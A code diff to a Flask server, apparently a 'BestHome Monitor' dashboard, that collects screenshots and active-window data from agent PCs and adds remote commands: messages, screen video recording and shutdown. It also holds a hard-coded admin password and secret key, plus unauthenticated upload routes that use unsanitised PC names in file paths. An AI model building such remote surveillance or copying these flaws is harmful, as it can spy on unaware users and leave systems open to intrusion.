@@ -1,26 +1,21 @@
 import os
-import time
 import sqlite3
-import json
-from datetime import datetime, timedelta
+from datetime import datetime
 from functools import wraps
 from flask import Flask, request, send_from_directory, render_template_string, redirect, url_for, session, jsonify
 
 app = Flask(__name__)
 app.secret_key = "besthome_monitor_2026_secret"
 
-# ==============================
-# KONFİQURASİYA
-# ==============================
 UPLOAD_FOLDER = "screens"
+VIDEO_TEMP = "temp_videos"
 DB_PATH = "monitor.db"
 ADMIN_EMAIL = "adminbesthome@gmail.com"
 ADMIN_PASSWORD = "AA161235aa"
-os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
-# ==============================
-# DB FUNKSİYALARI
-# ==============================
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+os.makedirs(VIDEO_TEMP, exist_ok=True)
+
 def get_db():
     conn = sqlite3.connect(DB_PATH)
     conn.row_factory = sqlite3.Row
@@ -36,7 +31,8 @@ def init_db():
             last_seen TEXT,
             active_window TEXT,
             active_process TEXT,
-            is_hidden INTEGER DEFAULT 0
+            is_hidden INTEGER DEFAULT 0,
+            pending_command TEXT DEFAULT NULL
         )
     """)
     conn.commit()
@@ -44,20 +40,12 @@ def init_db():
 
 init_db()
 
-# ==============================
-# LOGIN DECORATOR
-# ==============================
 def login_required(f):
     @wraps(f)
     def wrapper(*args, **kwargs):
-        if not session.get("logged_in"):
-            return redirect(url_for("login"))
+        if not session.get("logged_in"): return redirect(url_for("login"))
         return f(*args, **kwargs)
     return wrapper
-
-# ==============================
-# ROUTER-LAR
-# ==============================
 
 @app.route("/login", methods=["GET", "POST"])
 def login():
@@ -65,7 +53,6 @@ def login():
         if request.form.get("email") == ADMIN_EMAIL and request.form.get("password") == ADMIN_PASSWORD:
             session["logged_in"] = True
             return redirect(url_for("dashboard"))
-    
     return render_template_string("""
     <body style="background:#050910; color:white; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh;">
         <form method="post" style="background:#0f172a; padding:30px; border-radius:15px; width:300px;">
@@ -97,9 +84,43 @@ def upload():
             active_window=excluded.active_window,
             active_process=excluded.active_process
     """, (pc_name, datetime.utcnow().isoformat(), active_w, active_p))
+    
+    cur.execute("SELECT pending_command FROM agents WHERE name = ?", (pc_name,))
+    row = cur.fetchone()
+    cmd = row["pending_command"] if row else None
+    
+    if cmd:
+        cur.execute("UPDATE agents SET pending_command = NULL WHERE name = ?", (pc_name,))
+    
     conn.commit()
     conn.close()
-    return "OK", 200
+    return jsonify({"command": cmd})
+
+@app.route("/upload_video", methods=["POST"])
+def upload_video():
+    pc_name = request.form.get("pc_name")
+    video_file = request.files.get("video")
+    if video_file:
+        video_file.save(os.path.join(VIDEO_TEMP, f"{pc_name}_record.avi"))
+    return "OK"
+
+@app.route("/download_video/<name>")
+@login_required
+def download_video(name):
+    return send_from_directory(VIDEO_TEMP, f"{name}_record.avi", as_attachment=True)
+
+@app.route("/send_command/<name>", methods=["POST"])
+@login_required
+def send_command(name):
+    cmd_type = request.form.get("type")
+    val = request.form.get("val", "")
+    full_cmd = f"{cmd_type}:{val}"
+    conn = get_db()
+    cur = conn.cursor()
+    cur.execute("UPDATE agents SET pending_command = ? WHERE name = ?", (full_cmd, name))
+    conn.commit()
+    conn.close()
+    return redirect(url_for("dashboard"))
 
 @app.route("/toggle_hide/<name>")
 @login_required
@@ -128,140 +149,124 @@ def dashboard():
     now = datetime.utcnow()
     agents_list = []
     hidden_list = []
-    
     online_count = 0
     for a in all_agents:
         last_seen = datetime.fromisoformat(a["last_seen"])
         is_online = (now - last_seen).total_seconds() < 15
         if is_online: online_count += 1
-        
-        agent_data = {
-            "name": a["name"],
-            "online": is_online,
-            "window": a["active_window"],
-            "process": a["active_process"],
-            "is_hidden": a["is_hidden"]
-        }
-        
-        if a["is_hidden"]:
-            hidden_list.append(agent_data)
-        else:
-            agents_list.append(agent_data)
+        agent_data = {"name": a["name"], "online": is_online, "window": a["active_window"], "process": a["active_process"], "is_hidden": a["is_hidden"]}
+        if a["is_hidden"]: hidden_list.append(agent_data)
+        else: agents_list.append(agent_data)
 
     return render_template_string(HTML_TEMPLATE, agents=agents_list, hidden=hidden_list, online_count=online_count)
 
-# ==============================
-# MODERN DASHBOARD HTML
-# ==============================
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="utf-8">
-    <title>BestHome Live Monitor</title>
+    <title>BestHome Monitor PRO</title>
     <style>
         body { margin: 0; background: #020617; color: #e5e7eb; font-family: 'Segoe UI', sans-serif; display: flex; height: 100vh; overflow: hidden; }
         .sidebar { width: 260px; background: #0f172a; border-right: 1px solid #1e293b; display: flex; flex-direction: column; }
         .sidebar-header { padding: 20px; border-bottom: 1px solid #1e293b; font-weight: bold; color: #22c55e; display: flex; align-items: center; gap: 10px; }
         .sidebar-menu { flex: 1; overflow-y: auto; padding: 10px; }
-        .sidebar-item { padding: 12px; margin: 5px 0; border-radius: 8px; cursor: pointer; transition: 0.3s; font-size: 14px; display: flex; justify-content: space-between; align-items: center; }
+        .sidebar-item { padding: 12px; margin: 5px 0; border-radius: 8px; cursor: pointer; transition: 0.3s; font-size: 13px; display: flex; justify-content: space-between; align-items: center; }
         .sidebar-item:hover { background: #1e293b; }
         .main-content { flex: 1; display: flex; flex-direction: column; overflow-y: auto; }
         header { padding: 15px 25px; background: #020617; border-bottom: 1px solid #1e293b; display: flex; justify-content: space-between; align-items: center; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; padding: 25px; }
-        .card { background: #0f172a; border-radius: 12px; border: 1px solid #1e293b; overflow: hidden; transition: 0.3s; position: relative; }
-        .card:hover { transform: translateY(-5px); border-color: #22c55e; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(340px, 1fr)); gap: 20px; padding: 25px; }
+        .card { background: #0f172a; border-radius: 12px; border: 1px solid #1e293b; overflow: hidden; transition: 0.3s; }
         .screen-img { width: 100%; height: 180px; object-fit: cover; background: #000; cursor: pointer; }
         .card-info { padding: 15px; }
-        .pc-name { font-weight: bold; font-size: 16px; margin-bottom: 5px; display: flex; align-items: center; gap: 8px; }
+        .pc-name { font-weight: bold; font-size: 16px; margin-bottom: 8px; display: flex; align-items: center; gap: 8px; }
         .status-dot { width: 10px; height: 10px; border-radius: 50%; }
         .online { background: #22c55e; box-shadow: 0 0 10px #22c55e; }
         .offline { background: #ef4444; }
         .meta { font-size: 12px; color: #9ca3af; margin: 3px 0; }
-        .btn-hide { background: transparent; border: 1px solid #334155; color: #9ca3af; padding: 5px 10px; border-radius: 5px; cursor: pointer; font-size: 11px; margin-top: 10px; }
-        .unhide-btn { color: #22c55e; text-decoration: none; font-size: 12px; }
-        #overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:1000; justify-content:center; align-items:center; }
-        #overlay img { max-width: 95%; max-height: 95%; border: 2px solid #22c55e; border-radius: 10px; }
+        .controls { margin-top: 10px; display: flex; flex-wrap: wrap; gap: 5px; }
+        .btn { padding: 5px 10px; border-radius: 5px; cursor: pointer; font-size: 11px; border: 1px solid #334155; background: transparent; color: #e5e7eb; }
+        .btn-msg { border-color: #22c55e; color: #22c55e; }
+        .btn-video { border-color: #3b82f6; color: #3b82f6; }
+        .btn-kill { border-color: #ef4444; color: #ef4444; }
+        #overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:1000; justify-content:center; align-items:center; }
+        #overlay img { max-width: 90%; max-height: 90%; border: 2px solid #22c55e; }
     </style>
 </head>
 <body>
-
     <div class="sidebar">
-        <div class="sidebar-header">
-            <div style="background:#22c55e; color:#020617; padding:5px; border-radius:5px;">BH</div>
-            BestHome Monitor
-        </div>
+        <div class="sidebar-header">BH Monitor PRO</div>
         <div class="sidebar-menu">
-            <div style="color:#64748b; font-size:11px; text-transform:uppercase; margin-bottom:10px; padding-left:10px;">Gizlədilən Kompüterlər ({{ hidden|length }})</div>
+            <div style="color:#64748b; font-size:11px; margin-bottom:10px;">Gizli ({{ hidden|length }})</div>
             {% for h in hidden %}
-            <div class="sidebar-item">
-                <span>{{ h.name }}</span>
-                <a href="/toggle_hide/{{ h.name }}" class="unhide-btn">Göstər</a>
-            </div>
+            <div class="sidebar-item"><span>{{ h.name }}</span><a href="/toggle_hide/{{ h.name }}" style="color:#22c55e; text-decoration:none;">Aç</a></div>
             {% endfor %}
-        </div>
-        <div style="padding:20px; border-top:1px solid #1e293b; font-size:12px; color:#64748b;">
-            Online: {{ online_count }}
         </div>
     </div>
 
     <div class="main-content">
         <header>
-            <div style="font-size:18px;">Canlı Monitorinq <span style="color:#22c55e; font-size:14px; margin-left:10px;">● Real-Time</span></div>
-            <a href="/logout" style="color:#9ca3af; text-decoration:none; font-size:14px;">Çıxış</a>
+            <div>Monitorinq <span style="color:#22c55e; font-size:12px;">● Canlı</span></div>
+            <a href="/logout" style="color:#64748b; text-decoration:none; font-size:13px;">Çıxış</a>
         </header>
 
         <div class="grid">
             {% for a in agents %}
             <div class="card">
-                <img src="/screens/{{ a.name }}_last.jpg?t={{ range(1, 99999)|random }}" class="screen-img" onclick="fullScreen(this.src)">
+                <img src="/screens/{{ a.name }}_last.jpg" class="screen-img" onclick="fullScreen(this.src)">
                 <div class="card-info">
-                    <div class="pc-name">
-                        <div class="status-dot {{ 'online' if a.online else 'offline' }}"></div>
-                        {{ a.name }}
+                    <div class="pc-name"><div class="status-dot {{ 'online' if a.online else 'offline' }}"></div> {{ a.name }}</div>
+                    <div class="meta"><b>Pəncərə:</b> {{ a.window }}</div>
+                    
+                    <div class="controls">
+                        <form action="/send_command/{{ a.name }}" method="POST" style="display:flex; width:100%; gap:5px;">
+                            <input name="val" placeholder="Mesaj..." style="flex:1; background:#020617; border:1px solid #1e293b; color:white; font-size:11px; padding:4px;">
+                            <input type="hidden" name="type" value="msg">
+                            <button class="btn btn-msg">Göndər</button>
+                        </form>
+                        
+                        <form action="/send_command/{{ a.name }}" method="POST">
+                            <input type="hidden" name="type" value="video">
+                            <input type="hidden" name="val" value="start">
+                            <button class="btn btn-video">Video Başlat</button>
+                        </form>
+                        
+                        <form action="/send_command/{{ a.name }}" method="POST">
+                            <input type="hidden" name="type" value="video">
+                            <input type="hidden" name="val" value="stop">
+                            <button class="btn btn-video">Bitir</button>
+                        </form>
+
+                        <a href="/download_video/{{ a.name }}" style="text-decoration:none;"><button class="btn" style="border-color:orange; color:orange;">Yüklə</button></a>
+
+                        <form action="/send_command/{{ a.name }}" method="POST">
+                            <input type="hidden" name="type" value="cmd">
+                            <input type="hidden" name="val" value="shutdown">
+                            <button class="btn btn-kill">Söndür</button>
+                        </form>
                     </div>
-                    <div class="meta"><b>Proqram:</b> {{ a.process or 'N/A' }}</div>
-                    <div class="meta" style="white-space:nowrap; overflow:hidden; text-overflow:ellipsis;"><b>Pəncərə:</b> {{ a.window or 'N/A' }}</div>
-                    <a href="/toggle_hide/{{ a.name }}"><button class="btn-hide">Gizlət</button></a>
                 </div>
             </div>
             {% endfor %}
         </div>
     </div>
 
-    <div id="overlay" onclick="this.style.display='none'">
-        <img id="fullImg">
-    </div>
+    <div id="overlay" onclick="this.style.display='none'"><img id="fullImg"></div>
 
     <script>
         let currentFullImgSrc = "";
-
         function fullScreen(src) {
-            // Timestamp hissəsini silib təmiz linki yadda saxlayırıq
             currentFullImgSrc = src.split('?')[0]; 
             document.getElementById('fullImg').src = src;
             document.getElementById('overlay').style.display = 'flex';
         }
-
-        // Real-zamanlı yeniləmə
         setInterval(function(){
             let timestamp = new Date().getTime();
-            
-            // 1. Kiçik kartlardakı şəkilləri yenilə
             let images = document.getElementsByClassName('screen-img');
-            for(let img of images) {
-                let baseSrc = img.src.split('?')[0];
-                img.src = baseSrc + '?t=' + timestamp;
-            }
-
-            // 2. Böyük ekran açıqdırsa, onu da yenilə
+            for(let img of images) { img.src = img.src.split('?')[0] + '?t=' + timestamp; }
             let overlay = document.getElementById('overlay');
-            let fullImg = document.getElementById('fullImg');
-            
-            if (overlay.style.display === 'flex' && currentFullImgSrc !== "") {
-                fullImg.src = currentFullImgSrc + '?t=' + timestamp;
-            }
-        }, 1000);
+            if (overlay.style.display === 'flex') { document.getElementById('fullImg').src = currentFullImgSrc + '?t=' + timestamp; }
+        }, 3000);
     </script>
 </body>
 </html>
